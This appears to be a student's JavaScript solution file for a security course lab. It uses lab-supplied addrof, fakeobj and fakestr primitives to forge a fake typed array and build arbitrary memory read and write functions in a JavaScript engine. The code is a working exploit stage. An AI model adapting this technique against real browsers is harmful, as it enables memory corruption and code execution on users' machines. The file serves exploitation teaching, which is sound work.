/*
 * TODO: Part B solution goes here!
 */

let addrof = cs361s.addrof;
let fakeobj = cs361s.fakeobj;
let fakestr = cs361s.fakestr;

let dp = [0, 1, 2, 3];
let copy = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20];
let dataPlane = Uint32Array.from(dp);
let strHeader = "\x02\x00\x00\x00\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
let fakeStr1 = fakestr(addrof(strHeader) + 16);

let arrToCopy = Uint32Array.from(copy);
let diff = addrof(arrToCopy) - addrof(fakeStr1) - 16;
while (diff < 0 || diff > 0xff40) {
	arrToCopy = Uint32Array.from(copy);
	diff = addrof(arrToCopy) - addrof(fakeStr1) - 16;
}

let dataAddrStrOri = "00000000" + addrof(dataPlane).toString(16);
dataAddrStrOri = dataAddrStrOri.substring(dataAddrStrOri.length - 16);
let dataAddrStrRaw = "";
for (let i = 7; i >= 0; i--) {
        dataAddrStrRaw += String.fromCharCode(strToHex(dataAddrStrOri.substring(i * 2, i * 2 + 2)));
}

let controlPlaneStr = fakeStr1.substring(diff, diff + 0x38) + dataAddrStrRaw + fakeStr1.substring(diff + 0x40, diff + 0x48);
let controlPlane = fakeobj(addrof(controlPlaneStr) + 16);


function strToHex(str) {
	return Number("0x" + str);
}

function readmem(addr) {
	addrStr = "00000000" + addr.toString(16);
	addrStr = addrStr.substring(addrStr.length - 16);
	controlPlane[14] = strToHex(addrStr.substring(8, 16));
	controlPlane[15] = strToHex(addrStr.substring(0, 8));
	return dataPlane[0] >>> 0;
}

function writemem(addr, val) {
	addrStr = "00000000" + addr.toString(16);
	addrStr = addrStr.substring(addrStr.length - 16);
	controlPlane[14] = strToHex(addrStr.substring(8, 16));
	controlPlane[15] = strToHex(addrStr.substring(0, 8));
	dataPlane[0] = val >>> 0;
}
